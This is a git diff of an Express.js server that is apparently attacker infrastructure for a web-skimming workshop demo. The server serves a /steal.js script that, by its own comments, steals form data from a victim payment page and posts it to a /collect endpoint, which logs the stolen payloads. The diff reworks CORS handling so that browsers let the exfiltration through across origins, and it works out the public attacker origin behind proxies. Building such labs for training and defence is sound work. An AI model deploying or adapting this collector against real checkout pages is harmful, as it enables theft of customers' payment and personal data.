@@ -4,33 +4,128 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3001;
 
+if (process.env.TRUST_PROXY !== '0') {
+  app.set('trust proxy', 1);
+}
+
 // In-memory store for workshop demo (stolen payloads)
 const collected = [];
 
-// Allow requests from payment.fortinet.demo origin so steal.js can POST from the victim page
-const cors = (req, res, next) => {
-  const allowedOrigin = process.env.ALLOWED_ORIGIN || 'http://payment.fortinet.demo';
-  const origin = req.headers.origin;
-  
-  // Allow requests from payment.fortinet.demo
-  if (origin && (origin === allowedOrigin || origin.includes('payment.fortinet.demo'))) {
-    res.setHeader('Access-Control-Allow-Origin', origin);
-  } else {
-    res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
+function forwardedProto(req) {
+  const raw = req.get('x-forwarded-proto');
+  if (raw) return raw.split(',')[0].trim().toLowerCase();
+  return req.secure ? 'https' : (req.protocol || 'http').split(',')[0].trim().toLowerCase();
+}
+
+function forwardedHost(req) {
+  const raw = req.get('x-forwarded-host') || req.get('host');
+  if (!raw) return '';
+  return raw.split(',')[0].trim();
+}
+
+/** Public origin browsers use when calling /collect (matches WAF proto + Host). */
+function getPublicAttackerOrigin(req) {
+  const legacy = (process.env.ATTACKER_URL || '').trim();
+  if (legacy) {
+    const href = /^https?:\/\//i.test(legacy) ? legacy : `http://${legacy}`;
+    try {
+      const u = new URL(href.replace(/\/$/, ''));
+      return `${u.protocol}//${u.host}`;
+    } catch (_) {
+      return legacy.replace(/\/$/, '');
+    }
   }
-  
+  const proto = forwardedProto(req);
+  let host =
+    forwardedHost(req) ||
+    (process.env.ATTACKER_DOMAIN || '').trim();
+  if (!host) return `${proto}://127.0.0.1:${PORT}`;
+  let origin = `${proto}://${host}`;
+  const pubPort = (
+    process.env.ATTACKER_PUBLIC_PORT ||
+    process.env.EXTERNAL_ATTACKER_PORT ||
+    ''
+  ).trim();
+  if (pubPort && pubPort !== '80' && pubPort !== '443') {
+    origin += `:${pubPort}`;
+  }
+  return origin;
+}
+
+const DEFAULT_ORIGIN_SUFFIXES = ['fortinet.demo', 'packetsoprano.com'];
+
+function hostnameMatchesTrustedSuffix(hostname, suffixes) {
+  const h = hostname.toLowerCase();
+  for (let s of suffixes) {
+    s = String(s || '')
+      .trim()
+      .toLowerCase();
+    if (!s) continue;
+    if (s.startsWith('.')) s = s.slice(1);
+    if (h === s || h.endsWith(`.${s}`)) return true;
+  }
+  return false;
+}
+
+function corsOriginAllowed(origin) {
+  const commaAllow = String(process.env.ALLOWED_ORIGINS || '')
+    .split(',')
+    .map((s) => s.trim())
+    .filter(Boolean);
+  if (commaAllow.length) return commaAllow.includes(origin);
+
+  const single = (process.env.ALLOWED_ORIGIN || '').trim();
+  if (single && origin === single) return true;
+
+  const sufRaw =
+    process.env.TRUSTED_PAYMENT_ORIGIN_SUFFIX ||
+    DEFAULT_ORIGIN_SUFFIXES.join(',');
+
+  const suffixList = sufRaw.split(',').map((s) => s.trim()).filter(Boolean);
+  try {
+    const { hostname } = new URL(origin);
+    return hostnameMatchesTrustedSuffix(hostname, suffixList);
+  } catch (_) {
+    return false;
+  }
+}
+
+// Browsers POST from checkout origin; reflect allowed origins behind multi-domain setups.
+const cors = (req, res, next) => {
+  const origin = req.headers.origin;
+  const fallback =
+    exactSingleFallback(process.env.ALLOWED_ORIGINS, process.env.ALLOWED_ORIGIN);
+
+  if (origin && corsOriginAllowed(origin)) {
+    res.setHeader('Access-Control-Allow-Origin', origin);
+    res.setHeader('Vary', 'Origin');
+  } else if (fallback) {
+    res.setHeader('Access-Control-Allow-Origin', fallback);
+  } else {
+    res.setHeader('Access-Control-Allow-Origin', origin || '*');
+  }
+
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') return res.sendStatus(204);
   next();
 };
+
+function exactSingleFallback(allowedOriginsEnv, legacyEnv) {
+  const split = String(allowedOriginsEnv || '')
+    .split(',')
+    .map((s) => s.trim())
+    .filter(Boolean);
+  if (split.length) return split[0];
+  return (legacyEnv || '').trim() || '';
+}
 app.use(cors);
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // Serve the script that steals form data and sends it here (CORS: browser allows fetch to this origin)
 app.get('/steal.js', (req, res) => {
-  const baseUrl = getTargetUrl(req);
+  const baseUrl = getPublicAttackerOrigin(req);
   res.setHeader('Content-Type', 'application/javascript');
   res.send(`
 (function() {
@@ -107,18 +202,6 @@ app.get('/steal.js', (req, res) => {
 `);
 });
 
-function getTargetUrl(req) {
-  // Use the configured domain and port from environment variables
-  const domain = process.env.ATTACKER_DOMAIN || 'attacker.fortinet.demo';
-  const port = process.env.ATTACKER_PORT || '8080';
-  const proto = req.get('x-forwarded-proto') || req.protocol || 'http';
-  // Include port if it's not the default HTTP port (80)
-  if (port === '80') {
-    return proto + '://' + domain;
-  }
-  return proto + '://' + domain + ':' + port;
-}
-
 // Receive exfiltrated data (CORS allows POST from victim origin)
 app.post('/collect', (req, res) => {
   const payload = req.body || {};
@@ -127,7 +210,16 @@ app.post('/collect', (req, res) => {
   collected.push(entry);
   console.log('[COLLECT] Stolen data received:', JSON.stringify(payload, null, 2));
   console.log('[COLLECT] Total entries:', collected.length);
-  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
+  const origin = req.headers.origin;
+  if (origin && corsOriginAllowed(origin)) {
+    res.setHeader('Access-Control-Allow-Origin', origin);
+    res.setHeader('Vary', 'Origin');
+  } else {
+    res.setHeader(
+      'Access-Control-Allow-Origin',
+      origin || '*'
+    );
+  }
   res.status(200).json({ success: true, received: timestamp });
 });
 
